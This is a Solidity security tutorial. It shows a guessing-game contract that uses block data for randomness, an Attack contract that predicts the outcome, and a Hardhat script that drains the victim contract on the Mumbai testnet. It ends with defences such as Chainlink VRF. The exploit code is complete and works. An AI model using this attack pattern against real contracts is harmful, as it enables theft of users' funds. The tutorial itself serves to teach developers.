# Exploiting random numbers generators
In this quest we will use Hardhat again. So go ahead and do the usual setup, connect to Mumbai, and let's do this thing!

Generating “truly” random numbers has always been a challenge in Solidity. Because of the transparent/deterministic nature of blockchains, it is hard to implement a random pattern that can not be hacked. In other fields of development, you can write some crazy computation-intensive code for randomness, or you can simply hide your code and use built-in randomness features in the language you are using. In blockchains, since all info is open to the public, attackers may have an edge in this regard. In this quest, we will look at a common vulnerability when trying to achieve randomness in solidity. After that, we are going to look through some possible ways to generate random numbers. Ready? Set, to your keyboard!

## Writing the Guesser contract:
Some developers sometimes resort to using block specifications trying to implement some random behaviour. This is a big mistake, it can be easily hacked. Believe it or not, you just have to copy the source code of the contract to hack it. Well, not all the code, just the lines that are used to generate "random" numbers. Let’s take a look at this scenario:
There is a contract called Guesser, which has a function called guess that receives your input, adds it to a random number it generates, if the sum is even you win some MATICs, otherwise you lose it. Let’s take a look at the hackable contract:

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Guesser {
    constructor() payable {}

    function guess(uint256 _guess) public payable {
        require(msg.value == 1e15);
        uint256 rand = uint256(
            keccak256(
                abi.encodePacked(
                    blockhash(block.number - 1),
                    block.timestamp,
                    block.coinbase,
                    block.difficulty,
                    block.coinbase
                )
            )
        );
        if ((rand + _guess) % 2 == 0) {
            payable(msg.sender).transfer(2 * 1e15);
        }
    }

    receive() external payable {}

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

You send your guess along with a specified amount of MATIC to this function, then it generates a random number, adds it to your guess, checks if you won or not, and decides if it sends you the money or not. So what is happening in that weird keccak256 function? Keccak is a family of hash functions, keccak256 is a hash function that uses a 256-bit key. It produces a value in binary, but notice we are casting to uint256. As a parameter to keccak256, we gave a group of block specifications, packed them to bytes, and encoded them. I (because I do not know how randomness hack works) added some solidity-defined block info thinking it is a good choice. And I repeated the block.coinbase thinking I am outsmarting hackers. You can look for these specifications in Solidity’s cheatsheet: 
https://docs.soliditylang.org/en/v0.8.9/cheatsheet.html
Now, why is this contract extremely vulnerable? 
First, it leaves a chance for miners to cheat. Since they are the ones who create blocks and you are actually relying on this info (block info).
Secondly, remember, I have to send a guess hoping that it sums up to an even number with a number the Guesser generates.
I can create an Attack contract, write the same logic in Guesser, check if the “random” number is even and send zero (or any even number) as a guess, otherwise I send one (or any odd number), and I win!
Add the cotract above to your contracts directory, take a breath, and let’s write the Attack contract.

## Writing the Attack contract
This contract is simple. Since the target contract (Guesser) uses the block info to generate its rand number, we can examine what this number will be beforehand! 

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Guesser.sol";

contract Attack {
    function hack(Guesser guesser) public payable {
        uint256 rand = uint256(
            keccak256(
                abi.encodePacked(
                    blockhash(block.number - 1),
                    block.timestamp,
                    block.coinbase,
                    block.difficulty,
                    block.coinbase
                )
            )
        );
        if (rand % 2 == 0) {
            guesser.guess{value: msg.value}(0);
        } else guesser.guess{value: msg.value}(1);
    }

    receive() external payable {}

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

See what I did there? I simply checked the not-so-random Guesser will generate and sent an appropriate guess!

```js
if (rand % 2 == 0) {
    guesser.guess{value: msg.value}(0);
    } else guesser.guess{value: msg.value}(1);
```

This is how to call a payable function from another contract, you specify the value sent and the arguments list between parenthesis. In our case, there is only one argument. The Guesser contract is basically a free ATM machine!

## Attacking in Hardhat:
Like we did a couple of times already, let's si,ulate the hacking process in Hardhat. In your scripts directory, create an _Attack.js_:

```js
const { ethers } = require('hardhat')

const sleep = (milliseconds) => {
    return new Promise(resolve => setTimeout(resolve, milliseconds))
}

hack = async () => {
    let Guesser, guesser, Attack, attack, signers, victim, hacker, overrides, victimBalance, hackerBalance

    signers = await ethers.getSigners()
    victim = signers[0]
    hacker = signers[1]

    console.log("I am the victim and I am deploying my vulnerable contract:")
    Guesser = await ethers.getContractFactory('Guesser')
    overrides = {
        value: ethers.utils.parseEther("0.001")
    }
    guesser = await Guesser.deploy(overrides)
    console.log("The vulnerable contract was deployed to " + guesser.address)
    console.log("-----------------------------------------------")

    console.log("I am the hacker and I am deploying my attack contract:")
    Attack = await ethers.getContractFactory("Attack")
    attack = await Attack.connect(hacker).deploy()
    console.log("The attack contract was deployed to " + attack.address)
    console.log("-----------------------------------------------")

    victimBalance = await guesser.getBalance()
    hackerBalance = await attack.getBalance()
    console.log("The victim has " + victimBalance + " MATICs")
    console.log("The hacker has " + hackerBalance + " MATICs")
    console.log("-----------------------------------------------")

    console.log("The hacker is about to hack()")
    overrides = {
        value: ethers.utils.parseEther("0.001"),
        from: hacker.address
    }
    await attack.connect(hacker).hack(guesser.address, overrides)
    console.log("-----------------------------------------------")

    console.log("The hack is over:")
    await sleep(20000)
    victimBalance = await guesser.getBalance()
    hackerBalance = await attack.getBalance()
    console.log("The victim has " + victimBalance + " MATICs")
    console.log("The hacker has " + hackerBalance + " MATICs")
}
hack()
```

The usual stuff, huh? I promise, this is the last time haha.
Run ``` npx hardhat run Attack.js --network mumbai ```

You should get this log :

```
I am the victim and I am deploying my vulnerable contract:
The vulnerable contract was deployed to 0x3143d28625BEC1B58B9c8b53275224834f5914F6
-----------------------------------------------
I am the hacker and I am deploying my attack contract:
The attack contract was deployed to 0x8b27466B6bB2d3C58Cf6a6B9C4ed835f2711eA8c
-----------------------------------------------
The victim has 1000000000000000 MATICs
The hacker has 0 MATICs
-----------------------------------------------
The hacker is about to hack()
-----------------------------------------------
The hack is over:
The victim has 0 MATICs
The hacker has 2000000000000000 MATICs
```

So, how can we counter such attacks? Well, never use block specifications.
There are surely some good ways to generate random numbers in solidity. Let’s have a look at them!

## Final remarks:
You can think of many ways to generate random numbers. But unfortunately, it is really hard to do it in a system like a Blockchain. Hackers are really good at exploiting deterministic systems. I mean, if an attacker reads your contract hen there is a good chance they will exploit your randomness function.  One can argue that maybe there is no way to generate “truly” random numbers in decentralized systems. And here is the key, why don’t we look outside the Blockchain to look up random numbers? Well then we will be defying one of the basic rules of smart contracts, they are trustless. Gladly Chainlink has a solution for that. Chainlink allows blockchains to interact with off-chain data securely. There is also a way to achieve randomness using chainlink’s VRF (verifiable random function). You request and receive a random number that is unpredictable, this is one of the best solutions (https://blog.chain.link/random-number-generation-solidity/) . You can search for some other implementations. I found this one, for example: https://github.com/randao/randao . This is an on-chain solution, DAOs do not render your contract to a central point of failure, which is good! 
That being said, be careful when dealing with random number generators in Solidity. You can design your own random generator, but that is at your own expense. Or you can use some other creative implementations that the community recommends. Good luck and happy coding!